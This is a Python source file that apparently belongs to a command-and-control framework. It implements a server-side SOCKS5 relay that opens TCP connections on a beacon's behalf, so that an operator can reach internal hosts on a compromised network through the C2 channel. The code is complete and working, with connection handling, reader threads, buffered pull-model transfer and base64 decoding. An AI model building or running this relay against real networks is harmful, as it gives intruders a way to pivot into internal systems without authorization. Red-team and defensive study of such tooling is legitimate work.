"""Server-side SOCKS5 relay manager.

Coordinates outbound TCP connections that the team server dials on a beacon's
behalf (the beacon's local SOCKS5 clients connect to internal hosts through
the C2). Uses a pull model: the server reads from outbound sockets and queues
bytes; the beacon collects them on each checkin and writes them to its local
SOCKS client; beacon client->server bytes are written straight to the socket.
"""
import socket
import threading


class SocksRelay:
    def __init__(self, log=print):
        self.conns = {}           # conn_id -> {"sock": socket, "buf": bytearray}
        self.lock = threading.RLock()
        self.log = log

    def open(self, conn_id, host, port):
        with self.lock:
            if conn_id in self.conns:
                return False
            try:
                s = socket.create_connection((host, port), timeout=10)
                s.settimeout(1.0)
            except Exception as e:
                self.log(f"[socks] open {host}:{port} failed: {e}")
                return False
        self.conns[conn_id] = {"sock": s, "buf": bytearray(), "done": False}
        # reader thread: pull from socket into buffer until EOF
        threading.Thread(target=self._read_loop, args=(conn_id, s),
                         daemon=True).start()
        self.log(f"[socks] +conn {conn_id} -> {host}:{port}")
        return True

    def _read_loop(self, conn_id, s):
        while True:
            try:
                data = s.recv(65536)
                if not data:
                    raise OSError("EOF")
                with self.lock:
                    rec = self.conns.get(conn_id)
                    if rec is None:
                        break
                    rec["buf"].extend(data)
            except socket.timeout:
                continue
            except Exception:
                with self.lock:
                    rec = self.conns.get(conn_id)
                    if rec:
                        rec["done"] = True
                break

    def client_to_server(self, conn_id, b64data):
        import base64
        data = base64.b64decode(b64data)
        with self.lock:
            rec = self.conns.get(conn_id)
            if rec is None:
                return False
        try:
            rec["sock"].sendall(data)
            return True
        except Exception as e:
            self.close(conn_id)
            return False

    def drain(self, conn_id):
        """Return and clear buffered server->client bytes for this conn."""
        with self.lock:
            rec = self.conns.get(conn_id)
            if rec is None:
                return b""
            out = bytes(rec["buf"])
            rec["buf"] = bytearray()
            return out

    def conn_keys(self):
        with self.lock:
            return list(self.conns.keys())

    def is_done(self, conn_id):
        with self.lock:
            rec = self.conns.get(conn_id)
            return bool(rec and rec["done"])

    def close(self, conn_id):
        with self.lock:
            rec = self.conns.pop(conn_id, None)
        if rec:
            try:
                rec["sock"].close()
            except Exception:
                pass
        self.log(f"[socks] -conn {conn_id}")

    def close_all(self):
        for cid in list(self.conns):
            self.close(cid)
